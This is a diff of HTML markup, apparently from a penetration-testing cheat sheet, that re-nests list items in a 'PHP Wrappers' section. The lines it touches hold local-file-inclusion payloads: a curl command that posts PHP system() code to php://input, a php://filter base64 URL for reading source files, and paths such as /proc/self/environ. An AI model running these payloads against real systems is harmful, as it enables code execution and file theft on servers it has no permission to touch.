@@ -7843,10 +7843,14 @@
 </ul>
 <h2 id="php-wrappers">PHP Wrappers<a class="headerlink" href="#php-wrappers" title="Permanent link">&para;</a></h2>
 <ul>
-<li>File upload with POST data</li>
+<li>File upload with POST data<ul>
 <li><code class="codehilite"><span class="nx">curl</span> <span class="o">-</span><span class="nx">s</span> <span class="o">--</span><span class="nx">data</span> <span class="s2">&quot;</span><span class="cp">&lt;?</span><span class="nb">system</span><span class="p">(</span><span class="s1">&#39;ls -la&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="s2">&quot;</span> <span class="s2">&quot;http://target.host/web.php?file_path=php://input%00&quot;</span></code></li>
-<li>Base64 encode the LFI</li>
+</ul>
+</li>
+<li>Base64 encode the LFI<ul>
 <li><code class="codehilite"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">X</span><span class="p">.</span><span class="n">X</span><span class="p">.</span><span class="n">X</span><span class="p">.</span><span class="n">X</span><span class="o">/?</span><span class="n">page</span><span class="o">=</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span><span class="k">convert</span><span class="p">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="p">(</span><span class="n">PHP</span> <span class="n">FILE</span> <span class="n">NAME</span> <span class="k">NO</span> <span class="n">EXTENSION</span><span class="p">)</span></code></li>
+</ul>
+</li>
 </ul>
 <div class="codehilite"><pre><span></span><span class="err">/proc/self/environ</span>
 <span class="nx">C</span><span class="o">:</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">Temp</span><span class="err">\</span><span class="nx">php</span><span class="o">&lt;&lt;</span>
